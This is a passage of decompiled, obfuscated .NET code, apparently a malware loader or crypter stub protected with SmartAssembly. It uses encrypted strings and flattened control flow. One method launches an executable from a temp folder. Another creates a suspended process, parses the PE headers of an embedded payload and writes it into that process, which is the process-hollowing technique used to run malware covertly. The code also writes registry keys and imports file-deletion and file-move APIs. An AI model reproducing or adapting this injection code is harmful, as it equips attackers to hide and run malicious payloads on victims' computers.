        switch (num)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          default:
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_4;
        }
      }
label_4:
      return new \u0023qc.\u0023Sc(destinationArray);
    }
    catch (Exception ex)
    {
      byte[] numArray = destinationArray;
      \u0023qc.\u00236c obj = obj0;
      \u0023\u0023.\u0023Jk(ex, (object) numArray, (object) obj);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Fi([In] \u0023nf obj0) => obj0.\u0023kf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Gi([In] string obj0, [In] \u0023Xh obj1)
  {
    obj0 = obj0.Replace("%AppName%", "vf");
    obj0 = obj0.Replace("%CompanyName%", "fbff");
    return obj0;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Hi([In] string obj0, [In] string obj1)
  {
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly", true);
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            if (registryKey == null)
            {
              registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\RedGate\\SmartAssembly");
              goto case 1;
            }
            else
              goto case 1;
          case 1:
          case 3:
            registryKey.SetValue(obj1, (object) obj0);
            num1 = 4;
            continue;
          case 4:
            goto label_6;
          default:
            int num2 = 3;
            num1 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num2 : num2;
            continue;
        }
      }
label_6:
      registryKey.Close();
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Ii()
  {
label_0:
    int num1;
    int num2;
    string Left;
    string str1;
    string str2;
    object executablePath;
    string str3;
    string str4;
    string str5;
    string str6;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        Left = "hhhhhhhhhheeeee";
label_2:
        num2 = 3;
        str1 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_3:
        num2 = 4;
        if (Operators.CompareString(Left, \u0023\u0023.\u0023ei("SYgwSIDqN1G8QkK/jvXMGw=="), false) != 0)
          goto label_21;
label_4:
        num2 = 5;
        str2 = "" + Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
label_5:
        num2 = 6;
        executablePath = (object) Application.ExecutablePath;
label_6:
        num2 = 7;
        str3 = "ows\\CurrentV";
label_7:
        num2 = 8;
        str4 = "" + Interaction.Environ(\u0023\u0023.\u0023ei("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
label_8:
        num2 = 9;
        str5 = \u0023\u0023.\u0023ei("Rx4K5yj4QnSzaKx9pdBAPA==");
label_9:
        num2 = 10;
        str6 = Interaction.Environ(\u0023\u0023.\u0023ei("rRhnphBugUiRcVlpVgLfjw=="));
label_10:
        num2 = 11;
        Conversion.Int(3405);
label_11:
        num2 = 12;
        if (\u0023\u0023.\u00232h(str5))
          goto label_15;
label_12:
        num2 = 13;
        Conversion.Int(3405);
label_13:
        num2 = 14;
        Process.Start(str6 + "\\" + str5 + ".exe");
label_14:
        num2 = 15;
        Conversion.Int(3405);
label_15:
        num2 = 17;
        Conversion.Int(3405);
        goto label_21;
label_17:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num4 = num3 + 1;
            num3 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
              case 17:
                goto label_15;
              case 18:
              case 19:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      object[] objArray = new object[11]
      {
        (object) str1,
        (object) Left,
        executablePath,
        (object) str3,
        (object) str6,
        (object) str5,
        (object) str2,
        (object) str4,
        (object) num1,
        (object) num3,
        (object) num2
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [DllImport("shell32", EntryPoint = "ExtractIconEx")]
  internal static extern int \u0023Ji(
    [In] string obj0,
    [In] int obj1,
    [In] ref int obj2,
    [In] ref int obj3,
    [In] int obj4);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Ki([In] \u0023nf obj0) => obj0.\u0023ff;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Li([In] \u0023Uf obj0)
  {
    int num = 2;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          obj0.\u0023Jf.Enabled = true;
          num = 3;
          continue;
        case 1:
        case 3:
          obj0.\u0023Hf = (Image) \u0023\u0023.\u00235i("current");
          obj0.\u0023If = true;
          goto case 4;
        case 4:
          obj0.Refresh();
          num = 5;
          continue;
        case 5:
          goto label_6;
        default:
          num = 4;
          continue;
      }
    }
label_6:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Mi() => \u0023\u0023.\u00236h().\u0023Ng == (byte) 1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Ni([In] \u0023qc.\u0023Cc obj0, [In] int obj1)
  {
    int num1;
    int num2;
    try
    {
      num1 = obj0.\u0023Oc++;
      int num3 = 3;
      if (true)
        goto label_5;
label_1:
      throw new InvalidOperationException();
label_5:
      while (true)
      {
        int num4;
        switch (num3)
        {
          case 0:
          case 3:
            if (num1 != 32768)
            {
              byte[] hc = obj0.\u0023Hc;
              num2 = obj0.\u0023Nc++;
              int index = num2;
              int num5 = (int) (byte) obj1;
              hc[index] = (byte) num5;
              num4 = 4;
              break;
            }
            goto label_1;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_7;
          default:
            num4 = 2;
            break;
        }
        num3 = num4;
      }
label_7:
      obj0.\u0023Nc &= (int) short.MaxValue;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Cc cc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      \u0023\u0023.\u0023pl(ex, (object) local1, (object) local2, (object) cc, (object) local3);
      throw;
    }
  }

  [DllImport("kernel32.Dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern IntPtr \u0023Oi([In] IntPtr obj0, [In] string obj1);

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Pi([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
  internal static extern int \u0023Qi([In] int obj0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Ri()
  {
    try
    {
      return \u0023\u0023.\u0023Qi(89) != 0;
    }
    catch
    {
      return false;
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Si([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [DllImport("kernel32", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023Ti(string _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Ui([In] \u0023qc.\u0023Mc obj0, [In] int obj1)
  {
    try
    {
      obj0.\u0023Kc >>= obj1;
      obj0.\u0023Lc -= obj1;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Mc mc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) obj1;
      \u0023\u0023.\u0023Jk(ex, (object) mc, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023Vi([In] \u0023qc.\u0023Mc obj0)
  {
    try
    {
      return obj0.\u0023Ic == obj0.\u0023Jc;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Mc mc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) mc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Wi() => "Software\\Wow6432Node\\Red Gate\\" + \u0023\u0023.\u0023Ok();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Xi([In] int obj0, [In] int obj1, [In] \u0023qc.\u0023Mc obj2, [In] byte[] obj3)
  {
    int num1;
    try
    {
      int num2;
      int num3;
      if (obj2.\u0023Ic < obj2.\u0023Jc)
      {
        num2 = 0;
        goto label_8;
      }
      else
      {
        num1 = obj0 + obj1;
        if (0 <= obj0 && obj0 <= num1)
        {
          num3 = 4;
          goto label_9;
        }
      }
label_6:
      throw new ArgumentOutOfRangeException();
label_8:
      num3 = num2;
label_9:
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_2;
          case 1:
          case 4:
            if (num1 <= obj3.Length)
            {
              if ((obj1 & 1) == 0)
                goto case 2;
              else
                goto label_12;
            }
            else
              goto label_6;
          case 2:
          case 3:
            obj2.\u0023Hc = obj3;
            obj2.\u0023Ic = obj0;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num3 = 6;
              continue;
            }
            goto label_12;
          case 5:
            goto label_12;
          case 6:
            goto label_13;
          default:
            goto label_10;
        }
      }
label_2:
      throw new InvalidOperationException();
label_10:
      num2 = 5;
      goto label_8;
label_12:
      obj2.\u0023Kc |= (uint) (((int) obj3[obj0++] & (int) byte.MaxValue) << obj2.\u0023Lc);
      obj2.\u0023Lc += 8;
      num2 = 2;
      goto label_8;
label_13:
      obj2.\u0023Jc = num1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023Mc mc = obj2;
      byte[] numArray = obj3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) mc, (object) numArray, (object) local2, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Yi([In] string obj0, [In] \u0023Te obj1, [In] object obj2) => obj1.\u0023ye.Add(obj0, obj2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023Zi([In] \u0023qc.\u0023Mc obj0)
  {
    try
    {
      return obj0.\u0023Jc - obj0.\u0023Ic + (obj0.\u0023Lc >> 3);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Mc mc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) mc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u00230i([In] \u0023qc.\u0023Jd obj0)
  {
    int index;
    short num1;
    try
    {
      index = (obj0.\u0023vd << 5 ^ (int) obj0.\u0023Hc[obj0.\u0023Cd + 2]) & (int) short.MaxValue;
      int num2 = 3;
      while (true)
      {
        int num3 = num2;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 2:
              goto label_5;
            case 4:
              goto label_6;
            default:
              num3 = 2;
              continue;
          }
        }
label_1:
        obj0.\u0023xd[obj0.\u0023Cd & (int) short.MaxValue] = num1 = obj0.\u0023wd[index];
        obj0.\u0023wd[index] = (short) obj0.\u0023Cd;
label_5:
        obj0.\u0023vd = index;
        num2 = 4;
      }
label_6:
      return (int) num1 & (int) ushort.MaxValue;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<short> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) index;
      \u0023qc.\u0023Jd jd = obj0;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) local2, (object) jd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u00231i()
  {
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0023\u0023.\u0023Bj());
      int num1 = 2;
      string str;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              if (registryKey != null)
                goto case 3;
              else
                goto label_9;
            case 1:
            case 4:
              registryKey = Registry.LocalMachine.OpenSubKey(\u0023\u0023.\u0023Wi());
              goto case 3;
            case 3:
              if (registryKey != null)
              {
                str = (string) registryKey.GetValue("Path", (object) null);
                registryKey.Close();
                int num3 = 5;
                num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num3 : num3;
                continue;
              }
              goto label_2;
            case 5:
              goto label_10;
            default:
              num2 = 3;
              continue;
          }
        }
label_9:
        num1 = 4;
      }
label_2:
      return (string) null;
label_10:
      return str;
    }
    catch
    {
      return (string) null;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u00232i([In] object[] obj0)
  {
    int num1;
    try
    {
      num1 = 1;
label_1:
      int num2;
      if (\u0023\u0023.\u0023fj(obj0))
      {
        num2 = 2;
        goto label_7;
      }
      else
        goto label_6;
label_3:
      if (num1 > 6)
      {
        num2 = 4;
        goto label_7;
      }
      else
        goto label_1;
label_6:
      checked { ++num1; }
      goto label_3;
label_7:
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_5;
          case 1:
          case 3:
            goto label_3;
          case 4:
            goto label_9;
          default:
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 3;
              continue;
            }
            goto label_9;
        }
      }
label_5:
      return true;
label_9:
      return false;
    }
    catch (Exception ex)
    {
      bool flag;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local1 = (ValueType) flag;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      object[] objArray = obj0;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) local2, (object) objArray);
      throw;
    }
  }

  [DllImport("DHCPCSVC.dll", EntryPoint = "DhcpDeRegisterParamChange", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern long \u00233i(long _param0, [MarshalAs(UnmanagedType.AnsiBStr)] ref string _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00234i([In] \u0023dg obj0, [In] bool obj1)
  {
    int num1 = 3;
    if (true)
      goto label_4;
label_1:
    obj0.\u0023Jf.Enabled = obj1;
    int num2 = 1;
label_3:
    num1 = num2;
label_4:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_1;
        case 1:
          obj0.\u00239f = 0;
          goto case 2;
        case 2:
        case 4:
          obj0.Refresh();
          num1 = 5;
          continue;
        case 5:
          goto label_7;
        default:
          goto label_5;
      }
    }
label_7:
    return;
label_5:
    num2 = 4;
    goto label_3;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Bitmap \u00235i([In] string obj0)
  {
    try
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + obj0 + ".png");
      int num = 2;
      if (true)
        goto label_2;
label_1:
      Bitmap bitmap;
      if (manifestResourceStream == null)
      {
        bitmap = (Bitmap) null;
        goto label_6;
      }
      else
        goto label_4;
label_2:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_4;
          default:
            num = 3;
            continue;
        }
      }
label_4:
      bitmap = new Bitmap(manifestResourceStream);
label_6:
      return bitmap;
    }
    catch
    {
      return (Bitmap) null;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00236i([In] Exception obj0) => \u0023\u0023.\u0023ji(obj0, new object[0]);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00237i([In] \u0023qc.\u0023Qd obj0, [In] int obj1)
  {
    try
    {
      obj0.WriteByte((byte) (obj1 & (int) byte.MaxValue));
      obj0.WriteByte((byte) (obj1 >> 8 & (int) byte.MaxValue));
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Qd qd = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) obj1;
      \u0023\u0023.\u0023Jk(ex, (object) qd, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00238i([In] \u0023qc.\u0023md obj0, [In] int obj1)
  {
    int index;
    try
    {
      \u0023\u0023.\u00230k(obj0.\u0023Xc);
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              index = 0;
              break;
            case 1:
            case 3:
              \u0023\u0023.\u0023kk(obj0.\u00239c, obj1 - 4, 4);
              goto case 0;
            case 4:
              ++index;
              break;
            case 5:
              goto label_3;
            case 6:
              goto label_11;
            default:
              goto label_7;
          }
          if (index >= obj1)
          {
            \u0023\u0023.\u00236j(obj0.\u0023dd, obj0.\u0023Xc);
            num2 = 6;
          }
          else
            break;
        }
        \u0023\u0023.\u0023kk(obj0.\u00239c, (int) obj0.\u0023Xc.\u0023od[\u0023qc.\u0023md.\u00235c[index]], 3);
        num1 = 4;
        continue;
label_3:
        \u0023\u0023.\u00230k(obj0.\u0023dd);
        \u0023\u0023.\u00230k(obj0.\u0023Fc);
        \u0023\u0023.\u0023kk(obj0.\u00239c, obj0.\u0023dd.\u0023qd - 257, 5);
        \u0023\u0023.\u0023kk(obj0.\u00239c, obj0.\u0023Fc.\u0023qd - 1, 5);
        num1 = 3;
        continue;
label_7:
        num1 = 0;
      }
label_11:
      \u0023\u0023.\u00236j(obj0.\u0023Fc, obj0.\u0023Xc);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index;
      \u0023qc.\u0023md md = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj1;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) md, (object) local2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u00239i([In] \u0023qc.\u0023md.\u0023Pc obj0, [In] int obj1)
  {
    try
    {
      \u0023\u0023.\u0023kk(obj0.\u0023ud.\u00239c, (int) obj0.\u0023rd[obj1] & (int) ushort.MaxValue, (int) obj0.\u0023od[obj1]);
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023md.\u0023Pc pc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) obj1;
      \u0023\u0023.\u0023Jk(ex, (object) pc, (object) local);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023aj() => new Version("6.9.0.114").Major;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023bi([In] \u0023ge obj0, [In] \u0023yf obj1, [In] string obj2) => \u0023\u0023.\u0023bi(obj0, obj1, obj2, string.Empty);

  [DllImport("kernel32", EntryPoint = "MoveFileEx")]
  internal static extern bool \u0023bj(string _param0, string _param1, int _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023cj([In] \u0023qc.\u0023Mc obj0, [In] int obj1)
  {
    int num1;
    int num2;
    int num3;
    try
    {
      if (obj0.\u0023Lc < obj1)
      {
        int num4 = 4;
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 1:
              goto label_5;
            case 2:
            case 3:
              goto label_10;
            case 4:
              if (obj0.\u0023Ic == obj0.\u0023Jc)
              {
                num4 = 0;
                continue;
              }
              \u0023qc.\u0023Mc mc = obj0;
              int kc = (int) mc.\u0023Kc;
              byte[] hc1 = obj0.\u0023Hc;
              num1 = obj0.\u0023Ic++;
              int index1 = num1;
              int num5 = (int) hc1[index1] & (int) byte.MaxValue;
              byte[] hc2 = obj0.\u0023Hc;
              num2 = obj0.\u0023Ic++;
              int index2 = num2;
              int num6 = ((int) hc2[index2] & (int) byte.MaxValue) << 8;
              int num7 = (num5 | num6) << obj0.\u0023Lc;
              mc.\u0023Kc = (uint) (kc | num7);
              obj0.\u0023Lc += 16;
              num4 = 5;
              continue;
            case 5:
              goto label_8;
            default:
              num4 = 3;
              continue;
          }
        }
label_5:
        num3 = -1;
        goto label_10;
      }
label_8:
      num3 = (int) ((long) obj0.\u0023Kc & (long) ((1 << obj1) - 1));
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Mc mc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      \u0023\u0023.\u0023pl(ex, (object) local1, (object) local2, (object) mc, (object) local3);
      throw;
    }
label_10:
    return num3;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023dj([In] \u0023qc.\u0023Cc obj0, [In] int obj1, [In] int obj2, [In] int obj3)
  {
    int num1;
    try
    {
label_6:
      while (obj2-- > 0)
      {
        byte[] hc = obj0.\u0023Hc;
        num1 = obj0.\u0023Nc++;
        int index = num1;
        int num2 = (int) obj0.\u0023Hc[obj1++];
        hc[index] = (byte) num2;
        int num3 = 3;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 3:
              obj0.\u0023Nc &= (int) short.MaxValue;
              goto case 1;
            case 1:
            case 2:
              obj1 &= (int) short.MaxValue;
              num3 = 4;
              continue;
            case 4:
              goto label_6;
            default:
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num3 = 2;
                continue;
              }
              goto case 1;
          }
        }
      }
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023Cc cc = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) obj3;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) cc, (object) local2, (object) local3, (object) local4);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023ej([In] \u0023Te obj0, [In] EventHandler obj1)
  {
    int num1 = 1;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            goto label_1;
          case 1:
            goto label_8;
          case 2:
          case 5:
            goto label_4;
          case 4:
            goto label_3;
          case 6:
            goto label_9;
          default:
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 0;
              continue;
            }
            goto label_8;
        }
      }
label_1:
      EventHandler eventHandler1;
      EventHandler comparand;
      if (eventHandler1 == comparand)
      {
        num1 = 6;
        continue;
      }
label_3:
      comparand = eventHandler1;
      num1 = 5;
      continue;
label_4:
      EventHandler eventHandler2 = comparand + obj1;
      eventHandler1 = Interlocked.CompareExchange<EventHandler>(ref obj0.\u0023Je, eventHandler2, comparand);
      goto label_1;
label_8:
      eventHandler1 = obj0.\u0023Je;
      num1 = 4;
    }
label_9:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023fj([In] object[] obj0)
  {
    // ISSUE: variable of a compiler-generated type
    \u0023J.\u0023Ub ub;
    \u0023Z.\u0023Gb gb;
    \u0023Z.\u0023Hb hb;
    \u0023Z.\u0023Ib ib;
    \u0023Z.\u0023Jb jb;
    \u0023Z.\u0023Kb kb;
    \u0023Z.\u0023Lb lb;
    \u0023Z.\u0023Mb mb;
    \u0023Z.\u0023Nb nb;
    string str1;
    byte[] src;
    bool flag1;
    bool flag2;
    string str2;
    int num1;
    string str3;
    \u0023Z.\u0023eb eb;
    // ISSUE: variable of a compiler-generated type
    \u0023J.\u0023Ub.\u0023Zb zb;
    bool flag3;
    int int32_1;
    int[] numArray;
    int int32_2;
    uint SuspendCount;
    int int32_3;
    byte[] dst;
    int int32_4;
    int num2;
    int num3;
    short int16;
    byte[] bytes;
    int int32_5;
    int int32_6;
    int num4;
    int num5;
    int int32_7;
    bool flag4;
    try
    {
      // ISSUE: object of a compiler-generated type is created
      ub = new \u0023J.\u0023Ub();
      gb = \u0023J.\u0023Q<\u0023Z.\u0023Gb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("ABUKocXA/8U8/dTyQqSgxw=="));
      hb = \u0023J.\u0023Q<\u0023Z.\u0023Hb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("0r4Q+KffRShOMrJXQ5bIPBPfs2ueDUQLhElRpvSNOD8="));
      ib = \u0023J.\u0023Q<\u0023Z.\u0023Ib>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("Fk2eZIMApwcIWTEmb2cS+hpgxP8KTAVFVbM4GPTL2b4="));
      jb = \u0023J.\u0023Q<\u0023Z.\u0023Jb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("sBgrGtKz4j+pZ39VniTPP4yPMBN4WHVY4IS8ZY4fmSE="));
      kb = \u0023J.\u0023Q<\u0023Z.\u0023Kb>(\u0023\u0023.\u0023Fj("pdd3zZ5lwXtj8hV1GKRfVw=="), \u0023\u0023.\u0023Fj("2duPdAetIoKQy5xe5y0s2W+3unGrWO/nhF7+U9Kw7MI="));
      lb = \u0023J.\u0023Q<\u0023Z.\u0023Lb>(\u0023\u0023.\u0023Fj("pdd3zZ5lwXtj8hV1GKRfVw=="), \u0023\u0023.\u0023Fj("RxKVVbtH14pgjdXaw2C1YbWUQxywTFbqf/pZBB51J5c="));
      mb = \u0023J.\u0023Q<\u0023Z.\u0023Mb>(\u0023\u0023.\u0023Fj("Sk1N1W/kLlYPS5rz2GRFew=="), \u0023\u0023.\u0023Fj("TgOhAyN9YiqdYirD3QytuA=="));
      nb = \u0023J.\u0023Q<\u0023Z.\u0023Nb>(\u0023\u0023.\u0023Fj("pdd3zZ5lwXtj8hV1GKRfVw=="), \u0023\u0023.\u0023Fj("qt4tHmTORXFlu08c+szp/A=="));
      str1 = (string) obj0[0];
      src = (byte[]) obj0[1];
      flag1 = (bool) obj0[2];
      flag2 = (bool) obj0[3];
      str2 = (string) obj0[4];
      num1 = 0;
      str3 = string.Format("\"{0}\"", (object) str2);
      eb = new \u0023Z.\u0023eb();
      // ISSUE: reference to a compiler-generated field
      ub.\u0023Tb = new \u0023Z.\u00234();
      eb.\u00235 = Convert.ToUInt32(Marshal.SizeOf(typeof (\u0023Z.\u0023eb)));
      try
      {
        // ISSUE: object of a compiler-generated type is created
        zb = new \u0023J.\u0023Ub.\u0023Zb();
        // ISSUE: reference to a compiler-generated field
        zb.\u0023Xb = ub;
        int num6 = 4;
        if (\u0023\u0023.UBSgn55zIxbZDXest3e())
          goto label_39;
label_2:
        int num7;
        // ISSUE: reference to a compiler-generated field
        if (!gb(str2, str3, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, ref eb, ref ub.\u0023Tb))
        {
          num7 = 6;
        }
        else
        {
          int32_5 = BitConverter.ToInt32(src, 60);
          int32_1 = BitConverter.ToInt32(src, checked (int32_5 + 52));
          num7 = 11;
        }
label_38:
        num6 = num7;
label_39:
        while (true)
        {
          switch (num6)
          {
            case 0:
              goto label_13;
            case 1:
            case 10:
              goto label_6;
            case 2:
            case 9:
              goto label_30;
            case 3:
              // ISSUE: reference to a compiler-generated field
              if (zb.\u0023Vb != 0)
              {
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                if (ib(ub.\u0023Tb.\u00230, zb.\u0023Vb, src, zb.\u0023Wb, ref num1))
                {
                  num2 = checked (int32_5 + 248);
                  int16 = BitConverter.ToInt16(src, checked (int32_5 + 6));
                  num3 = 0;
                  goto case 12;
                }
                else
                  goto label_23;
              }
              else
                goto label_21;
            case 4:
              goto label_4;
            case 5:
              goto label_2;
            case 6:
              goto label_33;
            case 7:
              goto label_18;
            case 8:
              goto label_35;
            case 11:
              goto label_27;
            case 12:
              if (num3 > checked ((int) int16 - 1))
              {
                // ISSUE: reference to a compiler-generated field
                bytes = BitConverter.GetBytes(zb.\u0023Vb);
                if (\u0023\u0023.UBSgn55zIxbZDXest3e())
                {
                  num6 = 2;
                  continue;
                }
                goto label_18;
              }
              else
              {
                int32_4 = BitConverter.ToInt32(src, checked (num2 + 12));
                int32_6 = BitConverter.ToInt32(src, checked (num2 + 16));
